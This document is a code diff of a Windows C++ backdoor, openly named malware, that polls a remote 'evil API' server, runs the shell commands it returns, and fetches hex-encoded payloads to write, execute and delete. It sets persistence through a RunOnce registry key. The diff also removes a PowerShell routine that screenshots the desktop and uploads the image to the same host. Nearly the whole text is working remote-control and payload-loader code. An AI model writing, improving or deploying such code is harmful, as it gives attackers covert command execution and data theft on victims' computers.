@@ -9,12 +9,16 @@ Seu mau uso não é de minha responsabilidade.
 #include <iostream>
 #include <dirent.h>
 #include <fstream>
+#include <sstream>
+#include <iostream>
+#include <fstream>
+#include <ios>
 using namespace std;
 #pragma comment(lib,"libws2_32.a")
 void MalwareRun();
 string HttpGet(string url,string urlAction)
 {
-
+  unsigned int nret;
   WSADATA wsaData;
   SOCKET Socket;
   SOCKADDR_IN SockAddr;
@@ -22,13 +26,12 @@ string HttpGet(string url,string urlAction)
   int rowCount=0;
   struct hostent *host;
   locale local;
-  char buffer[10000];
-  int i = 0 ;
+  char buffer[2048];
   int nDataLength;
   string website_HTML;
   string get_http;
-  
-  if(urlAction == " ")
+
+  if(urlAction == " " || urlAction == "")
   {
     get_http = "GET HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
   }
@@ -36,12 +39,12 @@ string HttpGet(string url,string urlAction)
   {
     get_http = "GET "+ urlAction +" HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
   }
-  
+
       if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
       {
           return "error";
       }
-	  
+
       Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
       host = gethostbyname(url.c_str());
 
@@ -56,13 +59,14 @@ string HttpGet(string url,string urlAction)
 
       send(Socket,get_http.c_str(), strlen(get_http.c_str()),0 );
 
-      while ((nDataLength = recv(Socket,buffer,10000,0)) > 0){
-          int i = 0;
-          while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r'){
-
-              website_HTML+=buffer[i];
-              i += 1;
+      while (true)
+      {
+          nret = recv(Socket, buffer, sizeof(buffer), 0);
+          if(nret == 0 || nret == -1)
+          {
+            break;
           }
+          website_HTML.append(buffer, nret);
       }
 
       closesocket(Socket);
@@ -103,25 +107,69 @@ string DeserializeJson(string parameter,string htmlResponse)
    }
  return parameterDeserialize;
 }
+void HexToFile(string fileName,string hex)
+{
+  ofstream datafile(fileName.c_str(), ios_base::binary);
+
+  char buf[3];
+  buf[2] = 0;
+
+  stringstream input(hex);
+  input.flags(ios_base::hex);
+  while (input)
+  {
+      input >> buf[0] >> buf[1];
+      long val = strtol(buf, nullptr, 16);
+      datafile << static_cast<unsigned char>(val & 0xff);
+  }
+}
+void ExecByHex(string url,string urlAction)
+{
+  string htmlResponse = HttpGet(url,urlAction);
+  string hex = DeserializeJson("hex",htmlResponse);
+  string fileName = DeserializeJson("filename",htmlResponse);
+  string parameter = DeserializeJson("parameter",htmlResponse);
+  if(parameter == "null")
+  {
+    parameter = "";
+  }
+  HexToFile(fileName,hex);
+  string command = "start "+fileName+" "+parameter;
+  system(command.c_str());
+  remove(fileName.c_str());
+}
 void Malware()
 {
-  string url = "MinhaApiDoMal.com";
-  string urlTokenAction = "/generatetoken.php";
-
+  string url = "MinhaApiDoMal.com.br";
+  string urlActionScript =  "/bot/gethex.php";
+  
+  string urlTokenAction = "/bot/generatetoken.php";
   string apiToken = DeserializeJson("token",HttpGet(url,urlTokenAction));
-  string urlActionCommand = ("/getcommand.php?token="+apiToken);
+  string urlActionCommand = "/bot/getcommand.php?token="+apiToken;
 
   while(true)
   {
     try
     {
-      string command = DeserializeJson("commands",HttpGet(url,urlActionCommand));
-      string timeStr = DeserializeJson("time",HttpGet(url,urlActionCommand));
-      if(command != "error" && command != "null" && timeStr != "error")
+      string htmlResponse = HttpGet(url,urlActionCommand);
+      string command = DeserializeJson("commands",htmlResponse);
+      char commandCharArray[command.length() + 1];
+      strcpy(commandCharArray, command.c_str());
+
+      int time = stoi(DeserializeJson("time",htmlResponse));
+      if(command != urlActionCommand && command != "null" && commandCharArray[0] != '#')
       {
-        int time = stoi(timeStr);
         system(command.c_str());
         Sleep(time);
+      }
+      if(command != "error" && command != "null" && commandCharArray[0] == '#')
+      {
+        ExecByHex(url,urlActionScript);
+        Sleep(time);
+      }
+      else
+      {
+        continue;
       }
     }
     catch (exception ex)
@@ -129,35 +177,6 @@ void Malware()
       continue;
     }
   }
-}
-void CreatePrintScreenScript(string output)
-{
-  ofstream file;
-  string scriptPS1;
-  string urlUpload = "MinhaApiDoMal.com/upload.php";
-
-  file.open(output+"PrintScreen.ps1");
-
-  scriptPS1 += "Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n";
-  scriptPS1 += "$uploadPath = \"$env:USERPROFILE\\test.png\"\n";
-  scriptPS1 += "$uri = \""+urlUpload+"\"\n";
-  scriptPS1 += "$screens = [Windows.Forms.Screen]::AllScreens\n";
-  scriptPS1 += "$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum\n";
-  scriptPS1 += "$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum\n";
-  scriptPS1 += "$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum\n";
-  scriptPS1 += "$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n";
-  scriptPS1 += "$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)\n";
-  scriptPS1 += "$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)\n";
-  scriptPS1 += "$graphics = [Drawing.Graphics]::FromImage($bmp)\n";
-  scriptPS1 += "$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n";
-  scriptPS1 += "$bmp.Save($uploadPath)\n";
-  scriptPS1 += "$graphics.Dispose()\n";
-  scriptPS1 += "$bmp.Dispose()\n";
-  scriptPS1 += "Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials\n";
-  scriptPS1 += "Remove-Item $uploadPath";
-
-  file << scriptPS1 << endl;
-  file.close();
 }
 string current_working_directory()
 {
@@ -181,12 +200,8 @@ void InitConfig(string currentProgramName)
   string input = current_working_directory()+"\\"+currentProgramName;
   string output = pathUsers+username+pathTarget;
   CopyFile(input.c_str(),(output+finalProgramName).c_str(), TRUE);
-  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+finalProgramName+" -force";
+  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name mainsubprocess -Value "+output+finalProgramName+" -force";
   system(commandPowerShell.c_str());
-  if(currentProgramName != finalProgramName)
-  {
-    CreatePrintScreenScript(output);
-  }
 }
 int main(int argc,char *argv[])
 {
@@ -194,3 +209,4 @@ int main(int argc,char *argv[])
     Malware();
     return 1;
 }
+
